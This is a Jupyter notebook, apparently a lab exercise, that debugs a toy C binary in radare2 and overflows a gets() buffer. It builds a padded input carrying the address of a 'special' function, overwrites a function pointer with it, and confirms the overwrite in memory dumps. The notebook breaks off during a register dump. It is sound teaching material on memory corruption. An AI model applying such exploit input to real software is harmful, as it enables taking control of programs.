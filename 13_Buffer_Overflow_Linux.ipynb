{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "b16b8f81-0421-4ac7-830b-d43cf35f5f03",
   "metadata": {},
   "source": [
    "# R2 Overview:"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "caa380e4-bfe7-46db-a9d4-1964f3fdaf44",
   "metadata": {},
   "source": [
    "Remember to do:\n",
    "\n",
    "Setup\n",
    "\n",
    "List functions, then print code for one"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 193,
   "id": "08440346-e588-45d2-9ec8-fef8c8f42a93",
   "metadata": {},
   "outputs": [],
   "source": [
    "import pexpect\n",
    "import sys\n",
    "import time\n",
    "\n",
    "from IPython.core.magic import (register_line_magic, register_cell_magic,\n",
    "                                register_line_cell_magic)\n",
    "\n",
    "rp = pexpect.spawnu('r2 -d func-pointer', encoding='utf-8')\n",
    "\n",
    "@register_line_magic\n",
    "def r(line):\n",
    "    print(line)\n",
    "    rp.sendline(line)\n",
    "    time.sleep(.5)\n",
    "    end = \"\"\n",
    "    while not \"]>\" in end:\n",
    "        read = rp.read_nonblocking(100000)\n",
    "        print(read)\n",
    "        end = read[-50:]\n",
    "\n",
    "@register_line_magic\n",
    "def ro(line):\n",
    "    print(rp.read_nonblocking(100000))\n",
    "\n",
    "@register_line_magic\n",
    "def ri(line):\n",
    "    rp.sendline(line)\n",
    "    time.sleep(.5)\n",
    "    print(rp.read_nonblocking(100000))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 194,
   "id": "ca9c02b5-b367-4a25-8c4d-6526a6eba610",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "aa;e asm.syntax=att; afl;\n",
      "aa;e asm.syntax=att; afl;\n",
      "Process with PID 4787 started...\n",
      "= attach 4787 4787\n",
      "bin.baddr 0x00400000\n",
      "Using 0x400000\n",
      "asm.bits 64\n",
      "Warning: r_bin_file_hash: file exceeds bin.hashlimit\n",
      "\u001b[32m[x]\u001b[0m Analyze all flags starting with sym. and entry0 (aa)\n",
      "0x00400490    1 42           entry0\n",
      "0x004004c0    4 42   -> 37   sym.deregister_tm_clones\n",
      "0x004004f0    4 58   -> 55   sym.register_tm_clones\n",
      "0x00400530    3 34   -> 29   entry.fini0\n",
      "0x00400560    1 7            entry.init0\n",
      "0x00400660    1 2            sym.__libc_csu_fini\n",
      "0x00400664    1 9            sym._fini\n",
      "0x00400593    1 22           sym.other\n",
      "0x00400470    1 6            sym.imp.printf\n",
      "0x004005f0    4 101          sym.__libc_csu_init\n",
      "0x00400567    1 27           sym.special\n",
      "0x00400460    1 6            sym.imp.puts\n",
      "0x004005a9    1 58           main\n",
      "0x00400480    1 6            sym.imp.gets\n",
      "0x00400582    1 17           sym.normal\n",
      "0x00400438    3 23           sym._init\n",
      "\u001b[33m[0x7f5ba8dc7090]>\u001b[0m \u001b[?1001r\u001b[?1000l\n"
     ]
    }
   ],
   "source": [
    "%r aa;e asm.syntax=att; afl;"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 195,
   "id": "d4925339-2c39-4f04-b63c-1261c8d8050e",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "pdf @main\n",
      "            \u001b[31m\u001b[31m; DATA XREF from entry0 @ \u001b[31m0x4004ad\u001b[31m\u001b[0m\n",
      "\u001b[36m┌\u001b[0m 58: int \u001b[31mmain\u001b[0m (int argc, char **argv, char **envp);\n",
      "\u001b[36m│\u001b[0m           \u001b[37m; \u001b[37mvar \u001b[34mint64_t var_30h \u001b[36m@ rbp-0x30\u001b[0m\n",
      "\u001b[36m│\u001b[0m           \u001b[37m; \u001b[37mvar \u001b[34mint64_t var_24h \u001b[36m@ rbp-0x24\u001b[0m\n",
      "\u001b[36m│\u001b[0m           \u001b[37m; \u001b[37mvar \u001b[34mint64_t var_16h \u001b[36m@ rbp-0x16\u001b[0m\n",
      "\u001b[36m│\u001b[0m           \u001b[37m; \u001b[37mvar \u001b[34mint64_t var_8h \u001b[36m@ rbp-0x8\u001b[0m\n",
      "\u001b[36m│\u001b[0m           \u001b[37m; \u001b[37marg \u001b[34mint argc \u001b[36m@ rdi\u001b[0m\n",
      "\u001b[36m│\u001b[0m           \u001b[37m; \u001b[37marg \u001b[34mchar **argv \u001b[36m@ rsi\u001b[0m\n",
      "\u001b[36m│\u001b[0m           \u001b[32m0x004005a9\u001b[0m      \u001b[33m55\u001b[0m             \u001b[35mpushq\u001b[36m \u001b[0m%\u001b[36mrbp\u001b[0m\u001b[0m\u001b[0m\n",
      "\u001b[36m│\u001b[0m           \u001b[32m0x004005aa\u001b[0m      \u001b[33m48\u001b[37m89\u001b[37me5\u001b[0m         \u001b[37mmovq\u001b[36m \u001b[0m%\u001b[36mrsp\u001b[0m,\u001b[36m\u001b[36m \u001b[0m%\u001b[36mrbp\u001b[0m\u001b[0m\u001b[0m\n",
      "\u001b[36m│\u001b[0m           \u001b[32m0x004005ad\u001b[0m      \u001b[33m48\u001b[37m83\u001b[37mec\u001b[33m30\u001b[0m       \u001b[33msubq\u001b[36m $\u001b[33m0x30\u001b[0m,\u001b[36m\u001b[36m \u001b[0m%\u001b[36mrsp\u001b[0m\u001b[0m\u001b[0m\n",
      "\u001b[36m│\u001b[0m           \u001b[32m0x004005b1\u001b[0m      \u001b[37m89\u001b[33m7d\u001b[37mdc\u001b[0m         \u001b[37mmovl\u001b[36m \u001b[0m%\u001b[36medi\u001b[0m,\u001b[36m\u001b[36m var_24h\u001b[0m\u001b[0m\u001b[0m          \u001b[34m; argc\u001b[0m\n",
      "\u001b[36m│\u001b[0m           \u001b[32m0x004005b4\u001b[0m      \u001b[33m48\u001b[37m89\u001b[33m75\u001b[37md0\u001b[0m       \u001b[37mmovq\u001b[36m \u001b[0m%\u001b[36mrsi\u001b[0m,\u001b[36m\u001b[36m var_30h\u001b[0m\u001b[0m\u001b[0m          \u001b[34m; argv\u001b[0m\n",
      "\u001b[36m│\u001b[0m           \u001b[32m0x004005b8\u001b[0m      \u001b[33m48\u001b[37mc7\u001b[33m45\u001b[37mf8\u001b[37m82\u001b[37m05\u001b[37m.\u001b[0m  \u001b[37mmovq\u001b[36m $\u001b[36msym.normal\u001b[0m,\u001b[36m\u001b[36m var_8h\u001b[0m\u001b[0m\u001b[31m    ; 0x400582\u001b[0m\n",
      "\u001b[36m│\u001b[0m           \u001b[32m0x004005c0\u001b[0m      \u001b[33m48\u001b[37m8d\u001b[33m45\u001b[37mea\u001b[0m       \u001b[37mleaq\u001b[36m var_16h\u001b[0m,\u001b[36m\u001b[36m \u001b[0m%\u001b[36mrax\u001b[0m\u001b[0m\u001b[0m\n",
      "\u001b[36m│\u001b[0m           \u001b[32m0x004005c4\u001b[0m      \u001b[33m48\u001b[37m89\u001b[37mc7\u001b[0m         \u001b[37mmovq\u001b[36m \u001b[0m%\u001b[36mrax\u001b[0m,\u001b[36m\u001b[36m \u001b[0m%\u001b[36mrdi\u001b[0m\u001b[0m\u001b[0m\n",
      "\u001b[36m│\u001b[0m           \u001b[32m0x004005c7\u001b[0m      \u001b[37mb8\u001b[32m00\u001b[32m00\u001b[32m00\u001b[32m00\u001b[0m     \u001b[37mmovl\u001b[36m $0\u001b[0m,\u001b[36m\u001b[36m \u001b[0m%\u001b[36meax\u001b[0m\u001b[0m\u001b[0m\n",
      "\u001b[36m│\u001b[0m           \u001b[32m0x004005cc\u001b[0m      \u001b[37me8\u001b[37maf\u001b[37mfe\u001b[31mff\u001b[31mff\u001b[0m     \u001b[1;92mcallq sym.imp.gets\u001b[0m\u001b[0m\u001b[31m          ; char *gets(char *s)\u001b[0m\n",
      "\u001b[36m│\u001b[0m           \u001b[32m0x004005d1\u001b[0m      \u001b[33m48\u001b[37m8b\u001b[33m55\u001b[37mf8\u001b[0m       \u001b[37mmovq\u001b[36m var_8h\u001b[0m,\u001b[36m\u001b[36m \u001b[0m%\u001b[36mrdx\u001b[0m\u001b[0m\u001b[0m\n",
      "\u001b[36m│\u001b[0m           \u001b[32m0x004005d5\u001b[0m      \u001b[37mb8\u001b[32m00\u001b[32m00\u001b[32m00\u001b[32m00\u001b[0m     \u001b[37mmovl\u001b[36m $0\u001b[0m,\u001b[36m\u001b[36m \u001b[0m%\u001b[36meax\u001b[0m\u001b[0m\u001b[0m\n",
      "\u001b[36m│\u001b[0m           \u001b[32m0x004005da\u001b[0m      \u001b[31mff\u001b[37md2\u001b[0m           \u001b[32mcallq *%rdx\u001b[0m\u001b[0m\n",
      "\u001b[36m│\u001b[0m           \u001b[32m0x004005dc\u001b[0m      \u001b[37mb8\u001b[32m00\u001b[32m00\u001b[32m00\u001b[32m00\u001b[0m     \u001b[37mmovl\u001b[36m $0\u001b[0m,\u001b[36m\u001b[36m \u001b[0m%\u001b[36meax\u001b[0m\u001b[0m\u001b[0m\n",
      "\u001b[36m│\u001b[0m           \u001b[32m0x004005e1\u001b[0m      \u001b[37mc9\u001b[0m             \u001b[1;95mleave\u001b[0m\u001b[0m\u001b[0m\n",
      "\u001b[36m└\u001b[0m           \u001b[32m0x004005e2\u001b[0m      \u001b[37mc3\u001b[0m             \u001b[31mretq\u001b[0m\u001b[0m\u001b[0m\n",
      "\u001b[33m[0x7f5ba8dc7090]>\u001b[0m \u001b[?1001r\u001b[?1000l\n"
     ]
    }
   ],
   "source": [
    "%r pdf @main"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "0ebde03d-aaa6-4b4f-ad5b-242feddaad7e",
   "metadata": {},
   "source": [
    "# R2: Set Break Points:\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 196,
   "id": "a6e8b0d8-ecd9-4aff-9ba8-94bf3c18b7a5",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "db 0x004005d1\n",
      "\u001b[33m[0x7f5ba8dc7090]>\u001b[0m \u001b[?1001r\u001b[?1000lK\n"
     ]
    }
   ],
   "source": [
    "%r db 0x004005d1"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 197,
   "id": "d2176aea-36d8-4e20-9736-4ded21a26c0c",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "dc\n",
      "\u001b[33m[0x7f5ba8dc7090]>\u001b[0m dc\u001b[2K\n"
     ]
    }
   ],
   "source": [
    "%r dc"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "9086c23d-d438-4213-88a0-07bfd873ff2e",
   "metadata": {},
   "source": [
    "# R2 Interact:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 198,
   "id": "9a52cc24-2079-450b-b266-60c738e2263d",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "aaaaaaaaaaaaaag\u0005@\u0000\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "18"
      ]
     },
     "execution_count": 198,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "my_str = \"aaaaaaaaaaaaaa\"+chr(int(\"67\",16))+chr(int(\"05\",16))+chr(int(\"40\",16))+chr(int(\"00\",16))\n",
    "print(my_str)\n",
    "len(my_str)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 199,
   "id": "073b8e2e-58ec-4153-85c4-275f777d1f03",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "aaaaaaaaaaaaaag^E@^@\n",
      "hit breakpoint at: 4005d1\n",
      "\u001b[33m[0x004005d1]>\u001b[0m \u001b[?1001r\u001b[?1000l\n"
     ]
    }
   ],
   "source": [
    "%ri {my_str}"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 200,
   "id": "771b4d16-6e55-4ff6-87f0-ea1abfaecd83",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "pdf\n",
      "            \u001b[31m\u001b[31m; DATA XREF from entry0 @ \u001b[31m0x4004ad\u001b[31m\u001b[0m\n",
      "\u001b[36m┌\u001b[0m 58: int \u001b[31mmain\u001b[0m (int argc, char **argv, char **envp);\n",
      "\u001b[36m│\u001b[0m           \u001b[37m; \u001b[37mvar \u001b[34mint64_t var_30h \u001b[36m@ rbp-0x30\u001b[0m\n",
      "\u001b[36m│\u001b[0m           \u001b[37m; \u001b[37mvar \u001b[34mint64_t var_24h \u001b[36m@ rbp-0x24\u001b[0m\n",
      "\u001b[36m│\u001b[0m           \u001b[37m; \u001b[37mvar \u001b[34mint64_t var_16h \u001b[36m@ rbp-0x16\u001b[0m\n",
      "\u001b[36m│\u001b[0m           \u001b[37m; \u001b[37mvar \u001b[34mint64_t var_8h \u001b[36m@ rbp-0x8\u001b[0m\n",
      "\u001b[36m│\u001b[0m           \u001b[37m; \u001b[37marg \u001b[34mint argc \u001b[36m@ rdi\u001b[0m\n",
      "\u001b[36m│\u001b[0m           \u001b[37m; \u001b[37marg \u001b[34mchar **argv \u001b[36m@ rsi\u001b[0m\n",
      "\u001b[36m│\u001b[0m           \u001b[32m0x004005a9\u001b[0m      \u001b[33m55\u001b[0m             \u001b[35mpushq\u001b[36m \u001b[0m%\u001b[36mrbp\u001b[0m\u001b[0m\u001b[0m\n",
      "\u001b[36m│\u001b[0m           \u001b[32m0x004005aa\u001b[0m      \u001b[33m48\u001b[37m89\u001b[37me5\u001b[0m         \u001b[37mmovq\u001b[36m \u001b[0m%\u001b[36mrsp\u001b[0m,\u001b[36m\u001b[36m \u001b[0m%\u001b[36mrbp\u001b[0m\u001b[0m\u001b[0m\n",
      "\u001b[36m│\u001b[0m           \u001b[32m0x004005ad\u001b[0m      \u001b[33m48\u001b[37m83\u001b[37mec\u001b[33m30\u001b[0m       \u001b[33msubq\u001b[36m $\u001b[33m0x30\u001b[0m,\u001b[36m\u001b[36m \u001b[0m%\u001b[36mrsp\u001b[0m\u001b[0m\u001b[0m\n",
      "\u001b[36m│\u001b[0m           \u001b[32m0x004005b1\u001b[0m      \u001b[37m89\u001b[33m7d\u001b[37mdc\u001b[0m         \u001b[37mmovl\u001b[36m \u001b[0m%\u001b[36medi\u001b[0m,\u001b[36m\u001b[36m var_24h\u001b[0m\u001b[0m\u001b[0m          \u001b[34m; argc\u001b[0m\n",
      "\u001b[36m│\u001b[0m           \u001b[32m0x004005b4\u001b[0m      \u001b[33m48\u001b[37m89\u001b[33m75\u001b[37md0\u001b[0m       \u001b[37mmovq\u001b[36m \u001b[0m%\u001b[36mrsi\u001b[0m,\u001b[36m\u001b[36m var_30h\u001b[0m\u001b[0m\u001b[0m          \u001b[34m; argv\u001b[0m\n",
      "\u001b[36m│\u001b[0m           \u001b[32m0x004005b8\u001b[0m      \u001b[33m48\u001b[37mc7\u001b[33m45\u001b[37mf8\u001b[37m82\u001b[37m05\u001b[37m.\u001b[0m  \u001b[37mmovq\u001b[36m $\u001b[36msym.normal\u001b[0m,\u001b[36m\u001b[36m var_8h\u001b[0m\u001b[0m\u001b[31m    ; 0x400582\u001b[0m\n",
      "\u001b[36m│\u001b[0m           \u001b[32m0x004005c0\u001b[0m      \u001b[33m48\u001b[37m8d\u001b[33m45\u001b[37mea\u001b[0m       \u001b[37mleaq\u001b[36m var_16h\u001b[0m,\u001b[36m\u001b[36m \u001b[0m%\u001b[36mrax\u001b[0m\u001b[0m\u001b[0m\n",
      "\u001b[36m│\u001b[0m           \u001b[32m0x004005c4\u001b[0m      \u001b[33m48\u001b[37m89\u001b[37mc7\u001b[0m         \u001b[37mmovq\u001b[36m \u001b[0m%\u001b[36mrax\u001b[0m,\u001b[36m\u001b[36m \u001b[0m%\u001b[36mrdi\u001b[0m\u001b[0m\u001b[0m\n",
      "\u001b[36m│\u001b[0m           \u001b[32m0x004005c7\u001b[0m      \u001b[37mb8\u001b[32m00\u001b[32m00\u001b[32m00\u001b[32m00\u001b[0m     \u001b[37mmovl\u001b[36m $0\u001b[0m,\u001b[36m\u001b[36m \u001b[0m%\u001b[36meax\u001b[0m\u001b[0m\u001b[0m\n",
      "\u001b[36m│\u001b[0m           \u001b[32m0x004005cc\u001b[0m      \u001b[37me8\u001b[37maf\u001b[37mfe\u001b[31mff\u001b[31mff\u001b[0m     \u001b[1;92mcallq sym.imp.gets\u001b[0m\u001b[0m\u001b[31m          ; char *gets(char *s)\u001b[0m\n",
      "\u001b[36m│\u001b[0m           \u001b[36m;-- rip:\u001b[0m\n",
      "\u001b[36m│\u001b[0m           \u001b[32m\u001b[7m0x004005d1\u001b[0m b    \u001b[33m48\u001b[37m8b\u001b[33m55\u001b[37mf8\u001b[0m       \u001b[37mmovq\u001b[36m var_8h\u001b[0m,\u001b[36m\u001b[36m \u001b[0m%\u001b[36mrdx\u001b[0m\u001b[0m\u001b[0m\n",
      "\u001b[36m│\u001b[0m           \u001b[32m0x004005d5\u001b[0m      \u001b[37mb8\u001b[32m00\u001b[32m00\u001b[32m00\u001b[32m00\u001b[0m     \u001b[37mmovl\u001b[36m $0\u001b[0m,\u001b[36m\u001b[36m \u001b[0m%\u001b[36meax\u001b[0m\u001b[0m\u001b[0m\n",
      "\u001b[36m│\u001b[0m           \u001b[32m0x004005da\u001b[0m      \u001b[31mff\u001b[37md2\u001b[0m           \u001b[32mcallq *%rdx\u001b[0m\u001b[0m\n",
      "\u001b[36m│\u001b[0m           \u001b[32m0x004005dc\u001b[0m      \u001b[37mb8\u001b[32m00\u001b[32m00\u001b[32m00\u001b[32m00\u001b[0m     \u001b[37mmovl\u001b[36m $0\u001b[0m,\u001b[36m\u001b[36m \u001b[0m%\u001b[36meax\u001b[0m\u001b[0m\u001b[0m\n",
      "\u001b[36m│\u001b[0m           \u001b[32m0x004005e1\u001b[0m      \u001b[37mc9\u001b[0m             \u001b[1;95mleave\u001b[0m\u001b[0m\u001b[0m\n",
      "\u001b[36m└\u001b[0m           \u001b[32m0x004005e2\u001b[0m      \u001b[37mc3\u001b[0m             \u001b[31mretq\u001b[0m\u001b[0m\u001b[0m\n",
      "\u001b[33m[0x004005d1]>\u001b[0m \u001b[?1001r\u001b[?1000l\n"
     ]
    }
   ],
   "source": [
    "%r pdf"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "cad06ddd-c406-43a5-a24f-7a1c10b5b246",
   "metadata": {},
   "source": [
    "# Find Target:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 201,
   "id": "8c4d6569-e7eb-4351-8b15-077522970c6f",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "pdf @sym.normal\n",
      "            \u001b[31m\u001b[31m; DATA XREF from main @ \u001b[31m0x4005b8\u001b[31m\u001b[0m\n",
      "\u001b[36m┌\u001b[0m 17: \u001b[31msym.normal\u001b[0m ();\n",
      "\u001b[36m│\u001b[0m           \u001b[32m0x00400582\u001b[0m      \u001b[33m55\u001b[0m             \u001b[35mpushq\u001b[36m \u001b[0m%\u001b[36mrbp\u001b[0m\u001b[0m\u001b[0m\n",
      "\u001b[36m│\u001b[0m           \u001b[32m0x00400583\u001b[0m      \u001b[33m48\u001b[37m89\u001b[37me5\u001b[0m         \u001b[37mmovq\u001b[36m \u001b[0m%\u001b[36mrsp\u001b[0m,\u001b[36m\u001b[36m \u001b[0m%\u001b[36mrbp\u001b[0m\u001b[0m\u001b[0m\n",
      "\u001b[36m│\u001b[0m           \u001b[32m0x00400586\u001b[0m      \u001b[37mbf\u001b[37mb3\u001b[37m06\u001b[33m40\u001b[32m00\u001b[0m     \u001b[37mmovl\u001b[36m $\u001b[36mstr.this_is_the_normal_function\u001b[0m,\u001b[36m\u001b[36m \u001b[0m%\u001b[36medi\u001b[0m\u001b[0m\u001b[31m ; 0x4006b3\u001b[31m ; \"this is the normal function\"\u001b[0m\n",
      "\u001b[36m│\u001b[0m           \u001b[32m0x0040058b\u001b[0m      \u001b[37me8\u001b[37md0\u001b[37mfe\u001b[31mff\u001b[31mff\u001b[0m     \u001b[1;92mcallq sym.imp.puts\u001b[0m\u001b[0m\u001b[31m          ; int puts(const char *s)\u001b[0m\n",
      "\u001b[36m│\u001b[0m           \u001b[32m0x00400590\u001b[0m      \u001b[37m90\u001b[0m             \u001b[34mnop\u001b[0m\u001b[0m\u001b[0m\n",
      "\u001b[36m│\u001b[0m           \u001b[32m0x00400591\u001b[0m      \u001b[33m5d\u001b[0m             \u001b[1;95mpopq\u001b[36m \u001b[0m%\u001b[36mrbp\u001b[0m\u001b[0m\u001b[0m\n",
      "\u001b[36m└\u001b[0m           \u001b[32m0x00400592\u001b[0m      \u001b[37mc3\u001b[0m             \u001b[31mretq\u001b[0m\u001b[0m\u001b[0m\n",
      "\u001b[33m[0x004005d1]>\u001b[0m \u001b[?1001r\u001b[?1000l\n"
     ]
    }
   ],
   "source": [
    "%r pdf @sym.normal"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 202,
   "id": "429caba0-cba8-4b6c-8c38-63fdec1e4bbb",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "pdf @sym.special\n",
      "\u001b[36m┌\u001b[0m 27: \u001b[31msym.special\u001b[0m ();\u001b[2K\n",
      "\u001b[36m│\u001b[0m           \u001b[32m0x00400567\u001b[0m      \u001b[33m55\u001b[0m             \u001b[35mpushq\u001b[36m \u001b[0m%\u001b[36mrbp\u001b[0m\u001b[0m\u001b[0m\n",
      "\u001b[36m│\u001b[0m           \u001b[32m0x00400568\u001b[0m      \u001b[33m48\u001b[37m89\u001b[37me5\u001b[0m         \u001b[37mmovq\u001b[36m \u001b[0m%\u001b[36mrsp\u001b[0m,\u001b[36m\u001b[36m \u001b[0m%\u001b[36mrbp\u001b[0m\u001b[0m\u001b[0m\n",
      "\u001b[36m│\u001b[0m           \u001b[32m0x0040056b\u001b[0m      \u001b[37mbf\u001b[37m80\u001b[37m06\u001b[33m40\u001b[32m00\u001b[0m     \u001b[37mmovl\u001b[36m $\u001b[36mstr.this_is_the_special_function\u001b[0m,\u001b[36m\u001b[36m \u001b[0m%\u001b[36medi\u001b[0m\u001b[0m\u001b[31m ; 0x400680\u001b[31m ; \"this is the special function\"\u001b[0m\n",
      "\u001b[36m│\u001b[0m           \u001b[32m0x00400570\u001b[0m      \u001b[37me8\u001b[37meb\u001b[37mfe\u001b[31mff\u001b[31mff\u001b[0m     \u001b[1;92mcallq sym.imp.puts\u001b[0m\u001b[0m\u001b[31m          ; int puts(const char *s)\u001b[0m\n",
      "\u001b[36m│\u001b[0m           \u001b[32m0x00400575\u001b[0m      \u001b[37mbf\u001b[37m9d\u001b[37m06\u001b[33m40\u001b[32m00\u001b[0m     \u001b[37mmovl\u001b[36m $\u001b[36mstr.you_did_this__friend\u001b[0m,\u001b[36m\u001b[36m \u001b[0m%\u001b[36medi\u001b[0m\u001b[0m\u001b[31m ; 0x40069d\u001b[31m ; \"you did this, friend!\"\u001b[0m\n",
      "\u001b[36m│\u001b[0m           \u001b[32m0x0040057a\u001b[0m      \u001b[37me8\u001b[37me1\u001b[37mfe\u001b[31mff\u001b[31mff\u001b[0m     \u001b[1;92mcallq sym.imp.puts\u001b[0m\u001b[0m\u001b[31m          ; int puts(const char *s)\u001b[0m\n",
      "\u001b[36m│\u001b[0m           \u001b[32m0x0040057f\u001b[0m      \u001b[37m90\u001b[0m             \u001b[34mnop\u001b[0m\u001b[0m\u001b[0m\n",
      "\u001b[36m│\u001b[0m           \u001b[32m0x00400580\u001b[0m      \u001b[33m5d\u001b[0m             \u001b[1;95mpopq\u001b[36m \u001b[0m%\u001b[36mrbp\u001b[0m\u001b[0m\u001b[0m\n",
      "\u001b[36m└\u001b[0m           \u001b[32m0x00400581\u001b[0m      \u001b[37mc3\u001b[0m             \u001b[31mretq\u001b[0m\u001b[0m\u001b[0m\n",
      "\u001b[33m[0x004005d1]>\u001b[0m \u001b[?1001r\u001b[?1000l\n"
     ]
    }
   ],
   "source": [
    "%r pdf @sym.special"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "f8564873-5fed-4859-98f0-51e443dc8050",
   "metadata": {},
   "source": [
    "# Inspect Variables:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 203,
   "id": "9e77325f-01dc-4295-9165-78f08f60bd54",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "px 20 @ rbp-0x16\n",
      "\u001b[32m- offset -       0 1  2 3  4 5  6 7  8 9  A B  C D  E F  0123456789ABCDEF\n",
      "\u001b[0m\u001b[32m0x7ffda66baaca\u001b[0m  \u001b[33m61\u001b[0m\u001b[33m61\u001b[0m \u001b[33m61\u001b[0m\u001b[33m61\u001b[0m \u001b[33m61\u001b[0m\u001b[33m61\u001b[0m \u001b[33m61\u001b[0m\u001b[33m61\u001b[0m \u001b[33m61\u001b[0m\u001b[33m61\u001b[0m \u001b[33m61\u001b[0m\u001b[33m61\u001b[0m \u001b[33m61\u001b[0m\u001b[33m61\u001b[0m \u001b[33m67\u001b[0m\u001b[37m05\u001b[0m  \u001b[33ma\u001b[0m\u001b[33ma\u001b[0m\u001b[33ma\u001b[0m\u001b[33ma\u001b[0m\u001b[33ma\u001b[0m\u001b[33ma\u001b[0m\u001b[33ma\u001b[0m\u001b[33ma\u001b[0m\u001b[33ma\u001b[0m\u001b[33ma\u001b[0m\u001b[33ma\u001b[0m\u001b[33ma\u001b[0m\u001b[33ma\u001b[0m\u001b[33ma\u001b[0m\u001b[33mg\u001b[0m\u001b[37m.\u001b[0m\n",
      "\u001b[32m0x7ffda66baada\u001b[0m  \u001b[33m40\u001b[0m\u001b[32m00\u001b[0m \u001b[32m00\u001b[0m\u001b[32m00\u001b[0m                                \u001b[33m@\u001b[0m\u001b[32m.\u001b[0m\u001b[32m.\u001b[0m\u001b[32m.\u001b[0m\n",
      "\u001b[33m[0x004005d1]>\u001b[0m \u001b[?1001r\u001b[?1000l\n"
     ]
    }
   ],
   "source": [
    "%r px 20 @ rbp-0x16"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 204,
   "id": "01134707-e288-47e3-8f4f-a091a3d0cbca",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "px 16 @ rbp-0x8\n",
      "\u001b[32m- offset -       0 1  2 3  4 5  6 7  8 9  A B  C D  E F  0123456789ABCDEF\n",
      "\u001b[0m\u001b[32m0x7ffda66baad8\u001b[0m  \u001b[33m67\u001b[0m\u001b[37m05\u001b[0m \u001b[33m40\u001b[0m\u001b[32m00\u001b[0m \u001b[32m00\u001b[0m\u001b[32m00\u001b[0m \u001b[32m00\u001b[0m\u001b[32m00\u001b[0m \u001b[37mf0\u001b[0m\u001b[37m05\u001b[0m \u001b[33m40\u001b[0m\u001b[32m00\u001b[0m \u001b[32m00\u001b[0m\u001b[32m00\u001b[0m \u001b[32m00\u001b[0m\u001b[32m00\u001b[0m  \u001b[33mg\u001b[0m\u001b[37m.\u001b[0m\u001b[33m@\u001b[0m\u001b[32m.\u001b[0m\u001b[32m.\u001b[0m\u001b[32m.\u001b[0m\u001b[32m.\u001b[0m\u001b[32m.\u001b[0m\u001b[37m.\u001b[0m\u001b[37m.\u001b[0m\u001b[33m@\u001b[0m\u001b[32m.\u001b[0m\u001b[32m.\u001b[0m\u001b[32m.\u001b[0m\u001b[32m.\u001b[0m\u001b[32m.\u001b[0m\n",
      "\u001b[33m[0x004005d1]>\u001b[0m \u001b[?1001r\u001b[?1000l\n"
     ]
    }
   ],
   "source": [
    "# Need to overwrite this:\n",
    "%r px 16 @ rbp-0x8"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 35,
   "id": "b0e923a0-c4b6-4a6c-ae5b-43c54ddda2b0",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\u001b[32m- offset -   0 1  2 3  4 5  6 7  8 9  A B  C D  E F  0123456789ABCDEF\n",
      "\u001b[0m\u001b[32m0x00400500\u001b[0m  \u001b[33m48\u001b[0m\u001b[37mc1\u001b[0m \u001b[37mfe\u001b[0m\u001b[37m03\u001b[0m \u001b[33m48\u001b[0m\u001b[37m89\u001b[0m \u001b[37mf0\u001b[0m\u001b[33m48\u001b[0m \u001b[37mc1\u001b[0m\u001b[37me8\u001b[0m \u001b[33m3f\u001b[0m\u001b[33m48\u001b[0m \u001b[37m01\u001b[0m\u001b[37mc6\u001b[0m \u001b[33m48\u001b[0m\u001b[37md1\u001b[0m  \u001b[33mH\u001b[0m\u001b[37m.\u001b[0m\u001b[37m.\u001b[0m\u001b[37m.\u001b[0m\u001b[33mH\u001b[0m\u001b[37m.\u001b[0m\u001b[37m.\u001b[0m\u001b[33mH\u001b[0m\u001b[37m.\u001b[0m\u001b[37m.\u001b[0m\u001b[33m?\u001b[0m\u001b[33mH\u001b[0m\u001b[37m.\u001b[0m\u001b[37m.\u001b[0m\u001b[33mH\u001b[0m\u001b[37m.\u001b[0m\n",
      "\u001b[33m[0x004005da]>\u001b[0m \u001b[?1001r\u001b[?1000l\n"
     ]
    }
   ],
   "source": [
    "%r px 16 @ rdx"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 22,
   "id": "ae75277a-5ff6-43ec-b538-9e78f6a8eac5",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "rax = 0x7ffd7c2f392a0m dr\u001b[2K\n",
      "rbx = 0x00000000\n",
      "rcx = 0x7f60d3f53980\n",
      "rdx = 0x00000000\n",
      "r8 = 0x7ffd7c2f392a\n",
      "r9 = 0x00000000\n",
      "r10 = 0x0000006e\n",
      "r11 = 0x00000246\n",
      "r12 = 0x00400490\n",
      "r13 = 0x00000000\n",
      "r14 = 0x00000000\n",
